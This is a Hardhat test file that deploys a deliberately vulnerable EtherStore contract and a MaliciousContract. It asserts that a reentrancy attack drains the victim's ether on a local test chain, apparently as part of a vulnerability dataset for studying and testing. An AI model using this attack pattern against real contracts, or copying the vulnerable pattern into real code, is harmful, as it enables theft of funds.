const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for etherstore.sol", function () {
  let EtherStore;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract

    // Deploy EtherStore contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/etherstore.sol/EtherStore.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    EtherStore = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await EtherStore.deploy();
    await victim.waitForDeployment();
    //await victim.setLog(log.target); // Set Log address after deployment

    // Deploy MaliciousContract with EtherStore address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/etherstore_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("sanity check: reentrancy/etherstore.sol", async function () {
    await expect(victim.depositFunds({ value: ethers.parseEther("1") })).to.not
      .be.reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(
      ethers.parseEther("1"),
    );
    await expect(victim.withdrawFunds(ethers.parseEther("1"))).to.not.be
      .reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.depositFunds({ value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from hacker on victim contract
    await hacker.deposit({ value: ethers.parseEther("2") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7"));

    // Set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack(ethers.parseEther("1"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    hackerBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful

    // victim has lost more funds than the withdrawal
    expect(victimBalance).to.be.below(ethers.parseEther("6"));

    // hacker has more than the withdrawal
    expect(hackerBalance).to.be.above(ethers.parseEther("1"));
  });
});
